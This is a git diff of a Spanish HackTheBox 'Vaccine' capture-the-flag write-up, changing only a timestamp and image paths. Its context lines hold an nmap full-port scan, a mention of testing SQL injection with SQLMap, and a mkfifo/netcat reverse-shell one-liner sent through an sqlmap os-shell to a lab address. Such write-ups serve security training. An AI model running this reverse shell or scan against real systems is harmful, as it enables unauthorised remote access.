@@ -1,7 +1,7 @@
 ---
 publish: true
 created: 2026-09-11T12:16:55.949Z
-modified: 2026-09-11T12:24:56.666Z
+modified: 2026-09-11T18:12:58.428Z
 ---
 
 # Vaccine
@@ -32,7 +32,7 @@ Comenzamos con un escaneo para identificar que puertos están abiertos.
 sudo nmap -p- --open --min-rate 5000 -sS -n -Pn -vvv 10.129.249.41 -oG allports
 ```
 
-![image.png](/images/HackTheBox/image.png)
+![image.png](WriteUps/images/HackTheBox/image.png)
 
 ### **Enumeración de servicios**
 
@@ -42,7 +42,7 @@ Una vez listado los puertos accesibles, procederemos a realizar la enumeración 
 
 Buscamos con los scrips de reconocimiento las versiones
 
-![image.png](/images/HackTheBox/image%201.png)
+![image.png](WriteUps/images/HackTheBox/image 1.png)
 
 - **Identificación de vulnerabilidades**
 
@@ -132,7 +132,7 @@ Buscamos con los scrips de reconocimiento las versiones
 
   Enumeramos la web
 
-  ![image.png](/images/HackTheBox/image%202.png)
+  ![image.png](WriteUps/images/HackTheBox/image 2.png)
 
   Probamos a buscar con SQLMap si es vulenrable a SQLInjections:
 
@@ -223,9 +223,9 @@ os-shell> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.140 4444 >
 
 Obtenemos revershell:
 
-![image.png](/images/HackTheBox/image%203.png)
+![image.png](WriteUps/images/HackTheBox/image 3.png)
 
-![image.png](/images/HackTheBox/image%204.png)
+![image.png](WriteUps/images/HackTheBox/image 4.png)
 
 Miramos que hay en la parte de la web:
 
